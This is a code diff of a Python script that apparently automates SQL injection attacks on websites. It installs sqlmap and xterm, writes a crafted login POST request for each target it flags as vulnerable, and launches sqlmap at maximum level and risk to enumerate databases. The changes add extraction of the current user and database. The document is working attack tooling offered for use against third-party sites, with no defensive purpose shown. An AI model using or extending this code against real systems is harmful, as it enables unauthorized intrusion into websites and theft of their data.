@@ -23,11 +23,10 @@ def depen():
         l = cekos.read().splitlines()
         if l[6] == 'ID_LIKE=debian':
             xt = os.path.exists('/usr/bin/xterm')
-            sqlmap = os.path.exists('/usr/share/sqlmap')
-            if xt and sqlmap == True:
+            if xt == True:
                 pass
                 
-            elif xt and sqlmap == False:
+            elif xt == False:
                 user = os.getuid()
                 if user == 0:
                     pass
@@ -35,9 +34,23 @@ def depen():
                     print(c.b + c.r + '[!] Something missing, run me with sudo to install missing requirements' + c.res)
                     sys.exit(1)
                 print(c.g + c.b +"[*] Installing xterm ..." + c.res)
-                os.system('apt install xterm sqlmap -y')
+                os.system('apt install xterm -y')
                 BanSim()
+           
+            sqlmap = os.path.exists('/usr/share/sqlmap')
+            if sqlmap == True:
+                pass
             
+            elif sqlmap == False:
+                user = os.getuid()
+                if user == 0:
+                    pass
+                else:
+                    print(c.b + c.r + '[!] Something missing, run me with sudo to install missing requirements' + c.res)
+                    sys.exit(1)
+                print(c.g + c.b +"[*] Installing sqlmap ..." + c.res)
+                os.system('apt install sqlmap -y')
+                BanSim()
         else:
             print(c.b + c.r +'NOTE: you are not using linux based on debian, maybe something will wrong with this code ..' + c.res)
             time.sleep(5)
@@ -95,14 +108,14 @@ def Exploit(Target):
                 with open("output/vuln.txt", 'a') as w:
                     w.write(url_list + '\n')
                 with open("output/post_" + url_parse[1] +".txt", 'a') as we:
-                    we.write("""POST / HTTP/1.1\nHost: """+ url_list +"""\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 21\nOrigin: http://"""+ url_list +"""\nDNT: 1\nConnection: close\nReferer: http://"""+ url_list +"""/\nCookie: PHPSESSID=huvmumq33uu22oo2ml07indcdgtn3180qtv07kqhicabo0j9dqh0\nUpgrade-Insecure-Requests: 1\n\nusr=a&pwd=a&FBD=Masuk""")
+                    we.write("""POST / HTTP/1.1\nHost: """+ url_parse[1] +"""\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 21\nOrigin: http://"""+ url_parse[1] +"""\nDNT: 1\nConnection: close\nReferer: http://"""+ url_parse[1] +"""/\nCookie: PHPSESSID=huvmumq33uu22oo2ml07indcdgtn3180qtv07kqhicabo0j9dqh0\nUpgrade-Insecure-Requests: 1\n\nusr=a&pwd=a&FBD=Masuk""")
                 if attack == 'Y':
-                    print(c.b + c.g +'[+] Attacking vulnerable target ...'+ c.res)
-                    os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking site "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --dbs && sleep 10'")
+                    print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
+                    os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")
                         
                 elif attack == 'y':
-                    print(c.b + c.g +'[+] Attacking vulnerable target ...'+ c.res)
-                    os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking site "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --dbs && sleep 10'")
+                    print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
+                    os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")
                             
                 else:
                     pass
@@ -112,14 +125,14 @@ def Exploit(Target):
                 with open('output/vuln.txt', 'a') as w:
                     w.write(url_list + "\n")
                 with open("output/post_" + url_parse[1] +".txt", 'a') as we:
-                    we.write("""POST / HTTP/1.1\nHost: """+ url_list +"""\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 21\nOrigin: http://"""+ url_list +"""\nDNT: 1\nConnection: close\nReferer: http://"""+ url_list +"""/\nCookie: PHPSESSID=huvmumq33uu22oo2ml07indcdgtn3180qtv07kqhicabo0j9dqh0\nUpgrade-Insecure-Requests: 1\n\nusr=a&pwd=a*&FBD=Masuk""")
+                    we.write("""POST / HTTP/1.1\nHost: """+ url_parse[1] +"""\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 21\nOrigin: http://"""+ url_parse[1] +"""\nDNT: 1\nConnection: close\nReferer: http://"""+ url_parse[1] +"""/\nCookie: PHPSESSID=huvmumq33uu22oo2ml07indcdgtn3180qtv07kqhicabo0j9dqh0\nUpgrade-Insecure-Requests: 1\n\nusr=a&pwd=a*&FBD=Masuk""")
                 if attack == 'Y':
-                    print(c.b + c.g +'[+] Attacking vulnerable target ...'+ c.res)
-                    os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking site "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --dbs && sleep 10'")
+                    print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
+                    os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db  --dbs && sleep 10'")
                         
                 elif attack == 'y':
-                    print(c.b + c.g +'[+] Attacking vulnerable target ...'+ c.res)
-                    os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking site "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --dbs && sleep 10'")
+                    print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
+                    os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db  --dbs && sleep 10'")
                             
                 else:
                     pass
